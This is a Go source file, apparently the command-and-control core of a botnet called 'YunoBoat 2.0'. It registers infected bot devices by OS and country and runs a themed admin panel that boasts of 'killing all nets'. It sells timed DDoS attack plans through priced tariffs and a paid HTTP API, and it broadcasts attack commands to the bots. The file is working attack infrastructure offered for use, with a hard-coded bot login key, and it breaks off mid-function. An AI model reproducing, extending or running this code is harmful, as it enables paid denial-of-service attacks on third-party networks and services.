package main

// cnc.go — control-plane core: config, local.db store, tariffs, plans, bot
// registry, admin panel, single-concurrency gate.
//
// Files: attack.go (methods + wire), main.go (entry + dispatch), cnc.go (rest).

import (
	"bufio"
	"bytes"
	"crypto/rand"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"
)

// randomAPIKey mints a fresh personal API key ("yb_" + 48 hex chars).
func randomAPIKey() string {
	b := make([]byte, 24)
	if _, err := rand.Read(b); err != nil {
		return "yb_" + strconv.FormatInt(time.Now().UnixNano(), 16)
	}
	return "yb_" + hex.EncodeToString(b)
}

// ---------------------------------------------------------------------------
// Config
// ---------------------------------------------------------------------------

// ============================================================================
// CONFIG — edit everything here, then rebuild:
//     ./build.sh              (linux + win, installs to /root when run as root)
//     cd cnc && go build -o cnc .
//
// Environment variables (YB_*) override these constants when set, so an ops
// box can tune without recompiling; leaving them unset uses the values below.
// ============================================================================
const (
	// Bot control channel — bots connect here.
	CfgBotListen = "0.0.0.0:443"
	// Admin telnet panel.
	CfgAdminListen = "0.0.0.0:1234"
	// HTTP API (attack/status/tarifs/methods/users).
	CfgAPIListen = ":80"
	// Public API domain (informational — DNS pointing at this box).
	CfgAPIDomain = "yourdomain"
	// Bot login key — bots MUST present it in the handshake. Both bot builds
	// ship the same value baked in (XOR-obfuscated), so zero-config connects;
	// -k / upstream.key / YB_KEY override it.
	CfgLoginKey = "Yk9#vQ7!mP4$nW8&wR5tJx"
	// Discord webhook for reports; "" disables all webhooks.
	CfgWebhookURL = "your webhook"
	// JSON account/attack store file.
	CfgDBFile = "local.db"
)

var (
	listenAddr = env("YB_LISTEN", CfgBotListen)
	adminAddr  = env("YB_ADMIN", CfgAdminListen)
	apiAddr    = env("YB_API", CfgAPIListen)
	apiDomain  = env("YB_API_DOMAIN", CfgAPIDomain)
	dbFile     = env("YB_DB", CfgDBFile)
	authKey    = env("YB_KEY", CfgLoginKey)
)

func env(k, def string) string {
	if v := os.Getenv(k); v != "" {
		return v
	}
	return def
}

// ---------------------------------------------------------------------------
// local.db — JSON file store (no cgo, cross-compiles with CGO_ENABLED=0)
// ---------------------------------------------------------------------------

type Account struct {
	Username string `json:"username"`
	Password string `json:"password"`
	APIKey   string `json:"apikey"` // personal API key used by the HTTP API
	Plan     string `json:"plan"`   // "power","ultra","admin"
	Count    int    `json:"count"`  // concurrent slots
	MaxDur   int    `json:"maxdur"` // max attack seconds
	Admin    bool   `json:"admin"`
}

type Tariff struct {
	Name   string `json:"name"`
	Price  string `json:"price"`
	Count  int    `json:"count"`
	MaxDur int    `json:"maxdur"`
}

type AttackRec struct {
	ID       int64  `json:"id"`
	User     string `json:"user"`
	Target   string `json:"target"`
	Method   string `json:"method"`
	Port     int    `json:"port"`
	Duration int    `json:"duration"`
	Start    int64  `json:"start"`
}

type Store struct {
	mu        sync.Mutex
	file      string
	Users     map[string]*Account `json:"users"`
	Tarifs    []Tariff            `json:"tariffs"`
	Active    []*AttackRec        `json:"active"`
	Whitelist []string            `json:"whitelist"` // protected ip/domain entries
	Seq       int64               `json:"seq"`
	Sent      int64               `json:"sent"` // total attacks ever launched
}

var tariffsDefault = []Tariff{
	{Name: "Power", Price: "5$", Count: 2, MaxDur: 240},
	{Name: "Ultra Power", Price: "10$", Count: 4, MaxDur: 525},
	{Name: "Admin", Price: "∞", Count: 0, MaxDur: 21600},
}

func loadStore(file string) *Store {
	s := &Store{file: file}
	if b, err := os.ReadFile(file); err == nil {
		_ = json.Unmarshal(b, s)
	}
	fresh := false
	seededPw := ""
	if s.Users == nil {
		fresh = true
		seededPw = strongPassword(24)
		s.Users = map[string]*Account{
			"admin": {Username: "admin", Password: seededPw, APIKey: randomAPIKey(),
				Plan: "admin", Count: 0, MaxDur: 21600, Admin: true},
		}
	}
	// Backfill an API key for any account that predates the key system.
	for _, u := range s.Users {
		if u.APIKey == "" {
			u.APIKey = randomAPIKey()
		}
	}
	if s.Tarifs == nil {
		s.Tarifs = tariffsDefault
	}
	if s.Active == nil {
		s.Active = []*AttackRec{}
	}
	if s.Whitelist == nil {
		s.Whitelist = []string{}
	}
	s.save()
	if fresh {
		fmt.Printf("\x1b[1;36m[YunoBoat 2.0]\x1b[0m fresh database — seeded admin login:\n")
		fmt.Printf("\x1b[1;33m  username: \x1b[1;37madmin\x1b[0m\n")
		fmt.Printf("\x1b[1;33m  password: \x1b[1;37m%s\x1b[0m\n", seededPw)
		fmt.Printf("\x1b[0;37m  (shown once — it lives hashed-free in local.db)\x1b[0m\n")
	}
	return s
}

// strongPassword mints a hard-to-guess password: all four classes, crypto rand,
// no look-alike characters (0/O, 1/l/I dropped from the alphabets).
func strongPassword(n int) string {
	const upper = "ABCDEFGHJKLMNPQRSTUVWXYZ"
	const lower = "abcdefghijkmnopqrstuvwxyz"
	const digits = "23456789"
	const sym = "!@#$%^&*()-_=+[]{}<>?/"
	all := upper + lower + digits + sym
	if n < 8 {
		n = 8
	}
	out := make([]byte, n)
	for i := range out {
		out[i] = all[cryptoRandInt(len(all))]
	}
	out[0] = upper[cryptoRandInt(len(upper))]
	out[1] = lower[cryptoRandInt(len(lower))]
	out[2] = digits[cryptoRandInt(len(digits))]
	out[3] = sym[cryptoRandInt(len(sym))]
	return string(out)
}

func cryptoRandInt(max int) int {
	if max <= 0 {
		return 0
	}
	b := make([]byte, 8)
	_, _ = rand.Read(b)
	v := binary.BigEndian.Uint64(b)
	return int(v % uint64(max))
}

func (s *Store) save() {
	s.mu.Lock()
	s.saveLocked()
	s.mu.Unlock()
}

// saveLocked writes the store; caller must already hold s.mu.
func (s *Store) saveLocked() {
	b, _ := json.MarshalIndent(s, "", "  ")
	_ = os.WriteFile(s.file, b, 0600)
}

func (s *Store) TryLogin(u, p string) (bool, *Account) {
	s.mu.Lock()
	defer s.mu.Unlock()
	if a, ok := s.Users[u]; ok && a.Password == p {
		return true, a
	}
	return false, nil
}

// APIKeyFor returns the account's API key (creating one if somehow missing).
func (s *Store) APIKeyFor(user string) string {
	s.mu.Lock()
	defer s.mu.Unlock()
	if a, ok := s.Users[user]; ok {
		if a.APIKey == "" {
			a.APIKey = randomAPIKey()
			s.saveLocked()
		}
		return a.APIKey
	}
	return ""
}

// RotateAPIKey issues a fresh key for the account (or creates one).
func (s *Store) RotateAPIKey(user string) string {
	s.mu.Lock()
	defer s.mu.Unlock()
	if a, ok := s.Users[user]; ok {
		a.APIKey = randomAPIKey()
		s.saveLocked()
		return a.APIKey
	}
	return ""
}

// ByAPIKey resolves an account from a personal API key.
func (s *Store) ByAPIKey(key string) *Account {
	if key == "" {
		return nil
	}
	s.mu.Lock()
	defer s.mu.Unlock()
	for _, u := range s.Users {
		if u.APIKey == key {
			return u
		}
	}
	return nil
}

// Account resolves an account by username (nil when unknown).
func (s *Store) Account(name string) *Account {
	s.mu.Lock()
	defer s.mu.Unlock()
	if u, ok := s.Users[name]; ok {
		c := *u
		return &c
	}
	return nil
}

// CanLaunch validates the tariff limits + single-attack-concurrency lock:
// if any attack is already running, a new one is refused.
func (s *Store) CanLaunch(u *Account, target string, method string, dur int) (bool, error) {
	s.mu.Lock()
	defer s.mu.Unlock()
	now := time.Now().Unix()
	live := s.Active[:0]
	for _, a := range s.Active {
		if a.Start+int64(a.Duration) > now {
			live = append(live, a)
		}
	}
	s.Active = live
	if len(s.Active) > 0 {
		return false, fmt.Errorf("another attack is already running — wait for it to finish")
	}
	if !u.Admin {
		if dur > u.MaxDur {
			return false, fmt.Errorf("your %s plan caps at %d seconds", u.Plan, u.MaxDur)
		}
	}
	return true, nil
}

func (s *Store) RegisterAttack(u *Account, target string, method string, port, dur int) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.Seq++
	s.Sent++
	s.Active = append(s.Active, &AttackRec{
		ID: s.Seq, User: u.Username, Target: target, Method: method,
		Port: port, Duration: dur, Start: time.Now().Unix()})
	s.saveLocked()
}

// TotalSent returns the number of attacks ever launched.
func (s *Store) TotalSent() int64 {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.Sent
}

func (s *Store) Running() []*AttackRec {
	s.mu.Lock()
	defer s.mu.Unlock()
	now := time.Now().Unix()
	live := s.Active[:0]
	for _, a := range s.Active {
		if a.Start+int64(a.Duration) > now {
			live = append(live, a)
		}
	}
	s.Active = live
	return append([]*AttackRec{}, live...)
}

// Lookup returns a copy of an attack record by id (nil when unknown).
func (s *Store) Lookup(id int64) *AttackRec {
	s.mu.Lock()
	defer s.mu.Unlock()
	for _, a := range s.Active {
		if a.ID == id {
			c := *a
			return &c
		}
	}
	return nil
}

func (s *Store) CreateUser(u, p, plan string) error {
	s.mu.Lock()
	defer s.mu.Unlock()
	if _, ok := s.Users[u]; ok {
		return fmt.Errorf("user exists")
	}
	t := s.tariffFor(plan)
	s.Users[u] = &Account{Username: u, Password: p, APIKey: randomAPIKey(), Plan: plan,
		Count: t.Count, MaxDur: t.MaxDur, Admin: false}
	s.saveLocked()
	return nil
}

func (s *Store) tariffFor(plan string) Tariff {
	for _, t := range s.Tarifs {
		if strings.EqualFold(t.Name, plan) {
			return t
		}
	}
	return Tariff{Name: plan, Price: "?", Count: 1, MaxDur: 60}
}

func (s *Store) RemoveUser(u string) bool {
	s.mu.Lock()
	defer s.mu.Unlock()
	if _, ok := s.Users[u]; !ok {
		return false
	}
	delete(s.Users, u)
	s.saveLocked()
	return true
}

func (s *Store) UserCount() int {
	s.mu.Lock()
	defer s.mu.Unlock()
	return len(s.Users)
}

// UsersList returns a snapshot copy of all accounts (for the panel).
func (s *Store) UsersList() []Account {
	s.mu.Lock()
	defer s.mu.Unlock()
	out := make([]Account, 0, len(s.Users))
	for _, u := range s.Users {
		c := *u
		out = append(out, c)
	}
	return out
}

// ---------------------------------------------------------------------------
// Whitelist — protected targets (ip or domain). An attack whose target falls
// inside a whitelisted entry is refused with an explicit message.
// ---------------------------------------------------------------------------

// AddWhitelistEntry stores an ip or domain. Domains are stored as entered and
// resolved on every check, so DNS changes are picked up live.
func (s *Store) AddWhitelistEntry(entry string) error {
	entry = strings.TrimSpace(entry)
	if entry == "" {
		return fmt.Errorf("empty entry")
	}
	s.mu.Lock()
	defer s.mu.Unlock()
	for _, e := range s.Whitelist {
		if strings.EqualFold(e, entry) {
			return fmt.Errorf("already in whitelist")
		}
	}
	s.Whitelist = append(s.Whitelist, entry)
	s.saveLocked()
	return nil
}

func (s *Store) RemoveWhitelistEntry(entry string) bool {
	entry = strings.TrimSpace(entry)
	s.mu.Lock()
	defer s.mu.Unlock()
	for i, e := range s.Whitelist {
		if strings.EqualFold(e, entry) {
			s.Whitelist = append(s.Whitelist[:i], s.Whitelist[i+1:]...)
			s.saveLocked()
			return true
		}
	}
	return false
}

// WhitelistList returns a copy of the whitelist.
func (s *Store) WhitelistList() []string {
	s.mu.Lock()
	defer s.mu.Unlock()
	return append([]string{}, s.Whitelist...)
}

// IsWhitelistedTarget reports whether an attack target (ip or domain) falls
// inside a whitelisted entry. Resolves both sides, so a whitelisted domain
// blocks attacks against any of its current addresses.
func (s *Store) IsWhitelistedTarget(target string) bool {
	if target == "" {
		return false
	}
	entries := s.WhitelistList()
	tIPs := resolveAllIPs(target)
	if len(tIPs) == 0 {
		// unresolvable target — still block an exact-entry match
		for _, e := range entries {
			if strings.EqualFold(e, target) {
				return true
			}
		}
		return false
	}
	for _, e := range entries {
		if strings.EqualFold(e, target) {
			return true
		}
		eIPs := resolveAllIPs(e)
		for _, a := range tIPs {
			for _, b := range eIPs {
				if a.Equal(b) {
					return true
				}
			}
		}
	}
	return false
}

// resolveAllIPs parses an ip literal or resolves a domain to its addresses.
func resolveAllIPs(host string) []net.IP {
	host = strings.TrimSpace(host)
	if host == "" {
		return nil
	}
	if ip := net.ParseIP(host); ip != nil {
		return []net.IP{ip}
	}
	ips, err := net.LookupIP(host)
	if err != nil {
		return nil
	}
	return ips
}

// ---------------------------------------------------------------------------
// Device fingerprint + client registry
// ---------------------------------------------------------------------------

type Device struct {
	OS   string `json:"os"`
	Arch string `json:"arch"`
	Impl string `json:"impl"` // "cpp" / "java"
	Ver  byte   `json:"ver"`
	CC   string `json:"cc"`   // 2-letter country code from remote IP
}

type Bot struct {
	uid    string // stable identity: os/arch/impl/country + ip
	conn   net.Conn
	version byte
	source string // region tag
	dev    Device
}

func NewBot(conn net.Conn, version byte, source string, dev Device) *Bot {
	impl := "legacy"
	if version == 2 {
		impl = "cpp"
	} else if version == 3 {
		impl = "java"
	}
	dev.Impl = impl
	dev.Ver = version
	// Stable identity so a reconnecting device reuses its registry slot instead
	// of being re-created as a brand-new bot every time the link drops.
	ip, _, err := net.SplitHostPort(conn.RemoteAddr().String())
	if err != nil || ip == "" {
		ip = conn.RemoteAddr().String()
	}
	uid := strings.Join([]string{dev.OS, dev.Arch, impl, dev.CC, ip}, "|")
	return &Bot{uid: uid, conn: conn, version: version, source: source, dev: dev}
}

func (this *Bot) Handle() {
	clientList.AddClient(this)
	defer clientList.DelClient(this)
	buf := make([]byte, 2)
	for {
		this.conn.SetDeadline(time.Now().Add(180 * time.Second))
		if n, err := this.conn.Read(buf); err != nil || n != len(buf) {
			return
		}
		if _, err := this.conn.Write(buf); err != nil {
			return
		}
	}
}

func (this *Bot) QueueBuf(buf []byte) { _, _ = this.conn.Write(buf) }

type ClientList struct {
	mu         sync.Mutex
	clientsKey map[string]*Bot
}

func NewClientList() *ClientList {
	c := &ClientList{clientsKey: make(map[string]*Bot)}
	go c.printer()
	return c
}

func (c *ClientList) Count() int { c.mu.Lock(); defer c.mu.Unlock(); return len(c.clientsKey) }

func (c *ClientList) Distribution() map[string]int {
	c.mu.Lock()
	defer c.mu.Unlock()
	res := map[string]int{}
	for _, b := range c.clientsKey {
		// "os/arch/impl"
		k := b.dev.OS + "/" + b.dev.Arch + "/" + b.dev.Impl
		res[k]++
	}
	return res
}

func (c *ClientList) ByCountry() map[string]int {
	c.mu.Lock()
	defer c.mu.Unlock()
	res := map[string]int{}
	for _, b := range c.clientsKey {
		res[b.dev.CC]++
	}
	return res
}

func (c *ClientList) AddClient(b *Bot) {
	c.mu.Lock()
	// Reuse the slot if this device is already registered (reconnect): only
	// swap the live socket, keep the same registry entry so devices do not
	// get re-created on every reconnect.
	if old, ok := c.clientsKey[b.uid]; ok {
		if old.conn != b.conn {
			_ = old.conn.Close()
		}
		old.conn = b.conn
		old.dev = b.dev
		b = old
	} else {
		c.clientsKey[b.uid] = b
	}
	c.mu.Unlock()
	fmt.Printf("\x1b[1;32m[+] \x1b[0m\x1b[1;33m%s\x1b[0m \x1b[37m%s/%s %s\x1b[0m\n",
		b.conn.RemoteAddr().String(), b.dev.OS, b.dev.Arch, b.dev.Impl)
}

func (c *ClientList) DelClient(b *Bot) {
	c.mu.Lock()
	// Only remove the entry if the socket still matches this exact bot, so a
	// stale disconnect can't tear down a freshly re-registered socket.
	if cur, ok := c.clientsKey[b.uid]; ok && cur.conn == b.conn {
		delete(c.clientsKey, b.uid)
	}
	c.mu.Unlock()
}

func (c *ClientList) QueueBuf(buf []byte, maxbots int, cat string) {
	c.mu.Lock()
	defer c.mu.Unlock()
	sent := 0
	for _, b := range c.clientsKey {
		if maxbots != -1 && sent >= maxbots {
			break
		}
		if cat == "" || cat == b.dev.Impl || cat == b.source {
			b.QueueBuf(buf)
			sent++
		}
	}
}

func (c *ClientList) printer() {
	for {
		time.Sleep(10 * time.Second)
		c.mu.Lock()
		n := len(c.clientsKey)
		c.mu.Unlock()
		fmt.Printf("\x1b[1;36m[YunoBoat 2.0]\x1b[0m \x1b[1;37m%d\x1b[0m bots online\n", n)
	}
}

// ---------------------------------------------------------------------------
// Admin panel (three themes)
// ---------------------------------------------------------------------------

var themeNames = map[string]string{
	"1": "mirai", "2": "marine", "3": "yuno",
}

type Admin struct {
	conn   net.Conn
	reader *bufio.Reader
	theme  string
	user   *Account
}

// lockedConn prevents the title ticker and the interactive command loop from
// interleaving escape sequences on SSH. Kitty then receives complete OSC/ANSI
// sequences instead of rendering their bytes as visible text.
type lockedConn struct {
	net.Conn
	mu sync.Mutex
}

func (c *lockedConn) Write(p []byte) (int, error) {
	c.mu.Lock()
	defer c.mu.Unlock()
	return c.Conn.Write(p)
}

func NewAdmin(conn net.Conn) *Admin {
	locked := &lockedConn{Conn: conn}
	return &Admin{conn: locked, reader: bufio.NewReader(locked), theme: "1"}
}

func (a *Admin) banner() string {
	switch a.theme {
	case "2":
		return bannerMarine()
	case "3":
		return bannerYuno()
	default:
		return bannerMirai()
	}
}

func bannerMirai() string {
	const (
		dim  = "\x1b[1;30m"
		cyan = "\x1b[1;36m"
		off  = "\x1b[0m"
	)
	// Minimal Aisuru-style panel. Clean, no ASCII clutter.
	return dim + "  ───────────────────────────────\r\n" + off +
		cyan + "   yunaboat v2.0  —  minimal C2\r\n" + off +
		dim + "  ───────────────────────────────\r\n" + off
}

func bannerMarine() string {
	const (
		cyan  = "\x1b[1;36m"
		blue  = "\x1b[1;34m"
		white = "\x1b[1;37m"
		off   = "\x1b[0m"
	)
	return cyan + "  ~~~~~ YUNOBOAT 2.0 ~~~~~  " + off + "\r\n" +
		blue + "  ⚓ ~~~ ⛵ ~~~~~~ ☸ ~~~~~ ⛵ ~~~ ⚓  " + off + "\r\n" +
		cyan + "  ~ " + white + "KILLING ALL NETS WITH STYLE" + cyan + " ~  " + off + "\r\n" +
		blue + "      ~·~  sail under full power  ~·~      " + off + "\r\n"
}

func bannerYuno() string {
	const (
		pink  = "\x1b[1;35m"
		hot   = "\x1b[1;38;5;201m"
		white = "\x1b[1;37m"
		off   = "\x1b[0m"
	)
	return hot + "  ♥♥♥♥♥♥ Y U N O  G A S A I ♥♥♥♥♥♥  " + off + "\r\n" +
		pink + "  (◕‿◕✿) i will protect yuki forever (◕‿◕✿)  " + off + "\r\n" +
		hot + "  ♥  " + white + "YunoBoat 2.0 — yours and yours alone" + hot + "  ♥  " + off + "\r\n" +
		pink + "      ~~ we will be together forever ~~      " + off + "\r\n"
}

func (a *Admin) Handle() {
	// Alternate screen — kitty/wezterm/xterm all honour this over SSH. The
	// telnet IAC negotiation bytes are gone: ssh does that job now.
	a.conn.Write([]byte("\033[?1049h"))
	defer func() { a.conn.Write([]byte("\033[?1049l")) }()

	a.conn.SetDeadline(time.Now().Add(300 * time.Second))
	a.conn.Write([]byte("\033[2J\033[1H"))
	a.conn.Write([]byte("\x1b[1;38;5;201mYunoBoat 2.0\x1b[0m \x1b[37m| login\x1b[0m\r\n"))
	a.conn.Write([]byte("\x1b[1;33mUsername \x1b[1;37m> \x1b[0m"))
	user, err := a.ReadLine(false)
	if err != nil {
		return
	}
	a.conn.SetDeadline(time.Now().Add(300 * time.Second))
	a.conn.Write([]byte("\r\n\x1b[1;33mPassword \x1b[1;37m> \x1b[0m"))
	pass, err := a.ReadLine(true)
	if err != nil {
		return
	}
	// Verify spinner while the store checks the credentials.
	a.conn.SetDeadline(time.Now().Add(300 * time.Second))
	spinBuf := []byte{'V', 'e', 'r', 'i', 'f', 'y', '.', '.', '.'}
	for i := 0; i < 15; i++ {
		a.conn.Write(append([]byte("\r\x1b[0;36m✦ \x1b[1;30m"), spinBuf[i%len(spinBuf)]))
		time.Sleep(10 * time.Millisecond)
	}
	a.conn.Write([]byte("\r\n"))

	ok, acc := store.TryLogin(user, pass)
	if !ok {
		a.conn.Write([]byte("\r\x1b[0;31mWrong credentials, try again.\r\n"))
		b := make([]byte, 1)
		a.conn.Read(b)
		return
	}
	a.user = acc
	hookLogin(user)
	logLine("logins.txt", fmt.Sprintf("successful login | user:%s | ip:%s", user, a.conn.RemoteAddr()))
	a.enter()
}

// HandleAuthed — the SSH path. Credentials were already verified by the SSH
// password callback, so there is no second login prompt: straight into the
// panel with the authenticated username.
func (a *Admin) HandleAuthed(user string) {
	a.conn.Write([]byte("\033[?1049h"))
	defer func() { a.conn.Write([]byte("\033[?1049l")) }()
	acc := store.Account(user)
	if acc == nil {
		return
	}
	a.user = acc
	hookLogin(user)
	logLine("logins.txt", fmt.Sprintf("successful login | user:%s | ip:%s (ssh)", user, a.conn.RemoteAddr()))
	a.enter()
}

// enter — banner, title updates and the command loop (shared by both paths).
func (a *Admin) enter() {
	defer func() {
		a.conn.Write([]byte("\033[?1049l"))
	}()

	a.conn.Write([]byte("\033[2J\033[1H"))
	a.conn.Write([]byte(a.banner()))
	a.conn.Write([]byte(fmt.Sprintf("\x1b[1;35mplan: %s\x1b[0m  \x1b[1;37mbots: %d\x1b[0m  \x1b[37mwhitelist: %d\x1b[0m\r\n",
		a.user.Plan, clientList.Count(), len(store.WhitelistList()))))
	a.setWindowTitle()

	// Window-title ticker only — same as spoofed-main. We do NOT redraw any
	// on-screen line from the background: that races the interactive command
	// loop and corrupts the panel. Live stats come from `count` / `cls`.
	go func() {
		ticker := time.NewTicker(15 * time.Second)
		defer ticker.Stop()
		for range ticker.C {
			a.setWindowTitle()
		}
	}()

	for {
		a.conn.Write([]byte(a.prompt(a.user.Username)))
		cmd, err := a.ReadLine(false)
		if err != nil || cmd == "exit" || cmd == "quit" || cmd == "logout" || cmd == "/logout" {
			return
		}
		if cmd == "" {
			continue
		}
		logLine("commands.txt", fmt.Sprintf("user:%s | cmd:%s | ip:%s", a.user.Username, cmd, a.conn.RemoteAddr()))
		trimmed := strings.TrimPrefix(cmd, "/")
		switch {
		case trimmed == "cls" || trimmed == "clear" || trimmed == "c":
			a.conn.Write([]byte("\033[2J\033[1H"))
			a.conn.Write([]byte(a.banner()))
			a.conn.Write([]byte(a.help()))
		case trimmed == "?" || trimmed == "help":
			a.conn.Write([]byte(a.help()))
		case trimmed == "methods":
			a.conn.Write([]byte(a.methods()))
		case trimmed == "count":
			a.conn.Write([]byte(a.countText()))
		case trimmed == "countcs" || trimmed == "attacks":
			a.conn.Write([]byte(a.runningText()))
		case trimmed == "tarifs" || trimmed == "plans":
			a.conn.Write([]byte(a.tariffsText()))
		case trimmed == "whitelist" || trimmed == "wl":
			a.whitelistCmd("")
		case strings.HasPrefix(trimmed, "whitelist "):
			a.whitelistCmd(strings.TrimSpace(strings.TrimPrefix(trimmed, "whitelist ")))
		case strings.HasPrefix(trimmed, "wl "):
			a.whitelistCmd(strings.TrimSpace(strings.TrimPrefix(trimmed, "wl ")))
		case strings.HasPrefix(trimmed, "apikey"):
			a.apiKeyCmd(trimmed)
		case trimmed == "users":
			a.usersCmd()
		case strings.HasPrefix(trimmed, "user "):
			a.userCmd(strings.TrimSpace(strings.TrimPrefix(trimmed, "user ")))
		case strings.HasPrefix(trimmed, "theme"):
			a.setTheme(cmd)
		default:
			a.runAttack(trimmed, a.user.Username)
		}
	}
}

func (a *Admin) countLabel() string {
	if a.user.Admin || a.user.Count == 0 {
		return "∞"
	}
	return strconv.Itoa(a.user.Count)
}

func (a *Admin) prompt(u string) string {
	// Minimal Aisuru-style prompt: user@yunaboat# (slash commands).
	p := "#"
	if a.theme == "3" {
		p = "♥"
	}
	return "\x1b[1;35m" + u + "\x1b[0m@\x1b[1;36myunaboat\x1b[0m:" + p + " "
}

func (a *Admin) setTheme(cmd string) {
	parts := strings.Fields(cmd)
	if len(parts) < 2 {
		a.conn.Write([]byte("\r\n\x1b[37musage: theme 1|2|3 (1=minimal,2=marine,3=yuno)\r\n"))
		return
	}
	if name, ok := themeNames[parts[1]]; ok {
		a.theme = name
		a.conn.Write([]byte("\033[2J\033[1H"))
		a.conn.Write([]byte(a.banner()))
		a.conn.Write([]byte("\r\n\x1b[1;32mtheme: " + name + "\x1b[0m\r\n"))
	} else {
		a.conn.Write([]byte("\r\n\x1b[31minvalid theme\x1b[0m\r\n"))
	}
}

func (a *Admin) help() string {
	return "\r\n" +
		"\x1b[1;35m  /help\x1b[0m\x1b[37m            this menu\r\n" +
		"\x1b[1;35m  /methods\x1b[0m\x1b[37m          list attack methods\r\n" +
		"\x1b[1;35m  /count\x1b[0m\x1b[37m            online devices\r\n" +
		"\x1b[1;35m  /countcs\x1b[0m\x1b[37m          running attacks\r\n" +
		"\x1b[1;35m  /tarifs\x1b[0m\x1b[37m            plans / pricing\r\n" +
		"\x1b[1;35m  /apikey\x1b[0m\x1b[37m            show your api key\r\n" +
		"\x1b[1;35m  /apikey <user> rotate\x1b[0m\x1b[37m  rotate a key (admin)\r\n" +
		"\x1b[1;35m  /whitelist\x1b[0m\x1b[37m         protected targets (ip/domain)\r\n" +
		"\x1b[1;35m  /whitelist add <t>\x1b[0m\x1b[37m   add ip/domain to whitelist\r\n" +
		"\x1b[1;35m  /whitelist del <t>\x1b[0m\x1b[37m   remove from whitelist\r\n" +
		"\x1b[1;35m  /users\x1b[0m\x1b[37m             account list (admin)\r\n" +
		"\x1b[1;35m  /user add <n> <p|-> [plan]\x1b[0m\x1b[37m  register user (admin, p=- = strong)\r\n" +
		"\x1b[1;35m  /user admin <n> <p|->\x1b[0m\x1b[37m    register admin (admin)\r\n" +
		"\x1b[1;35m  /user del <n>\x1b[0m\x1b[37m         remove account (admin)\r\n" +
		"\x1b[1;35m  [-N] [@cat] <method> <ip> <sec>\x1b[0m\x1b[37m  attack (+flags)\r\n" +
		"\x1b[1;35m  /theme 1|2|3\x1b[0m\x1b[37m      panel style\r\n" +
		"\x1b[1;35m  /logout\x1b[0m\x1b[37m           disconnect\r\n\r\n"
}

// apiKeyCmd shows or rotates a personal API key.
func (a *Admin) apiKeyCmd(cmd string) {
	parts := strings.Fields(cmd)
	target := a.user.Username
	rotate := false
	for _, p := range parts[1:] {
		if p == "rotate" {
			rotate = true
		} else {
			target = p
		}
	}
	if target != a.user.Username && !a.user.Admin {
		a.conn.Write([]byte("\r\n\x1b[31madmin only\x1b[0m\r\n"))
		return
	}
	key := ""
	if rotate {
		key = store.RotateAPIKey(target)
	} else {
		key = store.APIKeyFor(target)
	}
	if key == "" {
		a.conn.Write([]byte("\r\n\x1b[31mno such user\x1b[0m\r\n"))
		return
	}
	a.conn.Write([]byte(fmt.Sprintf("\r\n\x1b[1;36mapi key\x1b[0m \x1b[1;35m%s\x1b[0m : \x1b[1;32m%s\x1b[0m\r\n",
		target, key)))
	a.conn.Write([]byte("\x1b[37m  GET http://" + apiDomain + apiAddr +
		"/attack?key=" + key + "&target=IP&method=udp&port=80&time=60\x1b[0m\r\n"))
}

// ---------------------------------------------------------------------------
// Whitelist + user management (panel side)
// ---------------------------------------------------------------------------

func (a *Admin) whitelistCmd(arg string) {
	fields := strings.Fields(arg)
	switch {
	case len(fields) == 0:
		entries := store.WhitelistList()
		a.conn.Write([]byte("\r\n\x1b[1;36m  whitelist\x1b[0m\r\n"))
		if len(entries) == 0 {
			a.conn.Write([]byte("  \x1b[37mempty\x1b[0m\r\n"))
		}
		for _, e := range entries {
			a.conn.Write([]byte(fmt.Sprintf("  \x1b[1;33m%s\x1b[0m\r\n", e)))
		}
		a.conn.Write([]byte("\x1b[37m  add: /whitelist add <ip|domain>   del: /whitelist del <ip|domain>\x1b[0m\r\n\r\n"))
	case (fields[0] == "add" || fields[0] == "+") && len(fields) >= 2:
		entry := fields[1]
		if err := store.AddWhitelistEntry(entry); err != nil {
			a.conn.Write([]byte(fmt.Sprintf("\r\n\x1b[31m%s\x1b[0m\r\n", err.Error())))
			return
		}
		ips := resolveAllIPs(entry)
		resolved := "unresolved"
		if len(ips) > 0 {
			parts := make([]string, 0, len(ips))
			for _, ip := range ips {
				parts = append(parts, ip.String())
			}
			resolved = strings.Join(parts, ", ")
		}
		a.conn.Write([]byte(fmt.Sprintf("\r\n\x1b[1;32mwhitelist: %s added (resolves to %s)\x1b[0m\r\n", entry, resolved)))
	case (fields[0] == "del" || fields[0] == "rm" || fields[0] == "-" || fields[0] == "remove") && len(fields) >= 2:
		if store.RemoveWhitelistEntry(fields[1]) {
			a.conn.Write([]byte(fmt.Sprintf("\r\n\x1b[1;32mwhitelist: %s removed\x1b[0m\r\n", fields[1])))
		} else {
			a.conn.Write([]byte(fmt.Sprintf("\r\n\x1b[31m%s not in whitelist\x1b[0m\r\n", fields[1])))
		}
	default:
		a.conn.Write([]byte("\r\n\x1b[37musage: /whitelist [add <ip|domain> | del <ip|domain>]\x1b[0m\r\n"))
	}
}

func (a *Admin) usersCmd() {
	if !a.user.Admin {
		a.conn.Write([]byte("\r\n\x1b[31madmin only\x1b[0m\r\n"))
		return
	}
	users := store.UsersList()
	a.conn.Write([]byte("\r\n\x1b[1;36m  users\x1b[0m\r\n"))
	for _, u := range users {
		plan := u.Plan
		if u.Admin {
			plan = "admin"
		}
		cnt := "∞"
		if !u.Admin && u.Count > 0 {
			cnt = strconv.Itoa(u.Count)
		}
		maxd := "∞"
		if u.MaxDur > 0 {
			maxd = strconv.Itoa(u.MaxDur) + "s"
		}
		a.conn.Write([]byte(fmt.Sprintf("  \x1b[1;35m%-12s\x1b[0m \x1b[37m%-7s\x1b[0m \x1b[37mcount:%s\x1b[0m \x1b[37mmax:%s\x1b[0m  \x1b[0;37m%s\x1b[0m\r\n",
			u.Username, plan, cnt, maxd, u.APIKey)))
	}
	a.conn.Write([]byte("\x1b[37m  add: /user add <name> <pass|-> [plan]   admin: /user admin <name> <pass|->\x1b[0m\r\n\r\n"))
}

func (a *Admin) userCmd(arg string) {
	if !a.user.Admin {
		a.conn.Write([]byte("\r\n\x1b[31madmin only\x1b[0m\r\n"))
		return
	}
	f := strings.Fields(arg)
	if len(f) == 0 {
		a.conn.Write([]byte("\r\n\x1b[37musage: /user add <name> <pass|-> [plan] | /user admin <name> <pass|-> | /user del <name>\x1b[0m\r\n"))
		return
	}
	switch f[0] {
	case "add":
		if len(f) < 3 {
			a.conn.Write([]byte("\r\n\x1b[37musage: /user add <name> <pass|-> [plan]\x1b[0m\r\n"))
